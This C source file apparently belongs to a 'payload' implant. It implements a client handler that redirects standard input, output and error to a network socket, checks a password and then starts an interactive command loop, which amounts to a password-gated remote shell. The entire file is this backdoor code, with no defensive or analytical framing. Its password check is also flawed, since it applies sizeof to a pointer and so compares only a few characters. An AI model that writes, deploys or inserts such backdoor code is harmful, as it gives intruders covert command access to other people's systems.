#include "payload.h"

static void	   dup_in_out_err_to(int fd);
static ssize_t read_with_timeout(
	int fd, char *buffer, size_t max_bytes, int timeout_seconds);

int handle_client(const char *const password, int client_fd) {
	char password_buff[20] = {0};
	Info("Received new client");
	dup_in_out_err_to(client_fd);
	if (read_with_timeout(
			client_fd, password_buff, sizeof(password_buff) - 1, 10) <= 0) {
		Warn("Client timed out after 10 seconds on password");
		return (-1);
	}
	if (strncmp(password_buff, password, sizeof(password) - 1) != 0) {
		Warnf("Client inputted wrong password, they tried %s", password_buff);
		write(client_fd, "wrong password\n", 16);
		return (-1);
	}
	repl();
	return (0);
}

static void dup_in_out_err_to(int fd) {
	dup2(fd, STDIN_FILENO);
	dup2(fd, STDOUT_FILENO);
	dup2(fd, STDERR_FILENO);

	return;
}

ssize_t read_with_timeout(
	int fd, char *buffer, size_t max_bytes, int timeout_seconds) {
	fd_set		   read_fds;
	struct timeval timeout;

	FD_ZERO(&read_fds);
	FD_SET(fd, &read_fds);

	timeout.tv_sec = timeout_seconds;
	timeout.tv_usec = 0;

	int activity = select(fd + 1, &read_fds, NULL, NULL, &timeout);

	if (activity < 0) {
		return (-1);
	} else if (activity == 0) {
		return (0);
	}

	if (FD_ISSET(fd, &read_fds)) {
		return read(fd, buffer, max_bytes);
	}

	return (-1);
}
